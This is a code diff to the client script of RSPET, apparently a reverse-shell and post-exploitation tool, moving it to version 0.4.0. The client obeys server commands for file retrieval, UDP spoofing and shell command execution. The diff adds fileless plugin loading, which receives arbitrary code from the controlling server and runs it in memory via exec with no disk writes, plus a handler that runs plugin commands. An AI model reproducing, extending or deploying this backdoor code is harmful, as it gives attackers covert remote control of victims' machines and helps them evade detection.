@@ -2,7 +2,8 @@
 # -*- coding: UTF-8 -*-
 """rspet_client.py: RSPET's Client-side script."""
 from __future__ import print_function
-from sys import exit as sysexit, argv
+from sys import exit as sysexit
+from sys import argv, modules
 from time import sleep
 from subprocess import Popen, PIPE
 from multiprocessing import Process, freeze_support
@@ -15,7 +16,7 @@ __author__ = "Kolokotronis Panagiotis"
 __copyright__ = "Copyright 2016, Kolokotronis Panagiotis"
 __credits__ = ["Kolokotronis Panagiotis", "Dimitris Zervas", "Lain Iwakura"]
 __license__ = "MIT"
-__version__ = "0.3.1"
+__version__ = "0.4.0"
 __maintainer__ = "Kolokotronis Panagiotis"
 
 
@@ -99,6 +100,7 @@ class Client(object):
         self.quit_signal = False
         self.version = ("%s-%s" %(__version__, "full"))
         self.plugins = {}
+        self.plugin_cmds = {}
         self.comm_dict = {
             '00000' : 'killMe',
             '00001' : 'getFile',
@@ -110,7 +112,8 @@ class Client(object):
             '00007' : 'command',
             '00008' : 'KILL',
             '00009' : 'loadPlugin',
-            '00010' : 'unloadPlugin'
+            '00010' : 'unloadPlugin',
+            '00011' : 'runPluginCommand'
         }
         self.comm_swtch = {
             'killMe'    : self.kill_me,
@@ -122,7 +125,8 @@ class Client(object):
             'udpSpoof'  : self.udp_spoof,
             'command'   : self.run_cm,
             'loadPlugin': self.load_plugin,
-            'unloadPlugin': self.unload_plugin
+            'unloadPlugin': self.unload_plugin,
+            'runPluginCommand' : self.run_plugin_cm
         }
 
     def loop(self):
@@ -218,6 +222,22 @@ class Client(object):
         if en_stdout == 0:
             en_stdout = self.send(decode)
         return 0
+
+    def run_plugin_cm(self):
+        """Exeute command defined in a plugin."""
+        en_data = self.receive(3) # Plugin command name up to 999 chars
+        command = self.receive(int(en_data))
+        args = []
+
+        # TODO: Decide if args are handled centrally or by local handler.
+
+        #num_of_args = self.receive(2) # Up to 99 arguments
+        #for i in range (0, int(num_of_args)):
+        #    en_data = self.receive(2) # Argument up to 99 chars
+        #    en_data = self.receive(int(en_data))
+        #    args.append(en_data)
+        
+        self.plugin_cmds[command]['exec'](self, args)
 
     def get_file(self):
         """Get file name and contents from server, create file."""
@@ -370,62 +390,39 @@ class Client(object):
         return 0
 
     def load_plugin(self):
-        """Asyncronously load a plugin."""
+        """Zero disk interaction module loading.
+        Taken from http://code.activestate.com/recipes/82234-importing-a-dynamically-generated-module/
+        Under PSF License.
+        Added code licensed under MIT."""
+        import imp
+        # Get plugin name.
         en_data = self.receive(3) # Max plugin name length 999 chars
-        en_data = self.receive(int(en_data))
-
-        try:
-            self.plugins[en_data] = __import__(en_data)
-            self.send("psl")
-        except ImportError:
-            self.send("pnl")
+        name = self.receive(int(en_data))
+        # Get plugin code.
+        en_data = self.receive(13) # Max plugin length 99999999999 chars
+        code = self.receive(int(en_data))
+        module = imp.new_module(name)
+        exec code in module.__dict__
+        # Add module reference to allow unloading.
+        self.plugins[name] = module
+        for element in dir(module):
+            # Root out "private" fields and already imported commands.
+            if not element.startswith("_") and element not in self.plugin_cmds:
+                self.plugin_cmds[element] = { 'exec' : getattr(module, element),
+                                            'module' : name}
 
     def unload_plugin(self):
         """Asyncronously unload a plugin."""
         en_data = self.receive(3) # Max plugin name length 999 chars
         en_data = self.receive(int(en_data))
-
+        for com in self.plugin_cmds:
+            # Remove module commands.
+            if en_data == self.plugin_cmds[com]["module"]:
+                self.plugin_cmds.pop(com)
         try:
-            del self.loaded_plugins[en_data]
+            del self.plugins[en_data]
         except ImportError:
             pass
-
-
-class PluginMount(type):
-    def __init__(cls, name, base, attr):
-        """Called when a Plugin derived class is imported
-
-        Gathers all methods needed from __cmd_states__ to __server_cmds__"""
-
-        tmp = cls()
-        for fn in cls.__client_cmds__:
-            # Load the function (if its from the current plugin) and see if
-            # it's marked. All plugins' commands are saved as function names
-            # without saving from which plugin they come, so we have to mark
-            # them and try to load them
-
-            if cls.__client_cmds__ is not None:
-                continue
-
-            try:
-                f = getattr(tmp, fn)
-                if f.__is_command__:
-                    cls.__server_cmds__[fn] = f
-            except AttributeError:
-                pass
-
-class Plugin(object):
-    """Plugin class (to be extended by plugins)"""
-    __metaclass__ = PluginMount
-
-    __client_cmds__ = {}
-
-
-# Plugin decorator
-def command(fn):
-    Plugin.__client_cmds__[fn.__name__] = None
-
-    return fn
 
 
 def main():
